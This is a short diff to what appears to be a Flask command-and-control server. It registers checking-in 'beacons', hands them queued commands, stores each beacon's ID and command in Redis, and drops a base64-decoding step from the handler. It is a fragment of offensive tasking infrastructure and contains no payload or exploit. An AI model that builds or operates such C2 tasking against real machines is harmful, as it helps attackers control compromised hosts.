@@ -66,7 +66,6 @@ def index(filename):
     if request.method == 'GET':
         bID = {request.headers['APPSESSIONID']}
         name = request.headers['RESPONSE']
-        melamo = f'{base64.decode(name)}'
         print(f'Host {bID} grabbed command')
         bID = str(bID)
         bID = re.sub('[^A-Za-z0-9]+', '', bID) # We are removing special characters
@@ -75,7 +74,7 @@ def index(filename):
         for line in content:
             cmd = line
         conn.hset('beacons', f'{bID}', f'{cmd}') # Add the beacon ID and command to the redis DB
-        conn.hset('beacons', f'{bID}', f'{melamo}')
+        conn.hset('beacons', f'{bID}', f'{name}')
         conn.hgetall('beacons')
         return send_from_directory('.', filename)
     return jsonify(request.data)
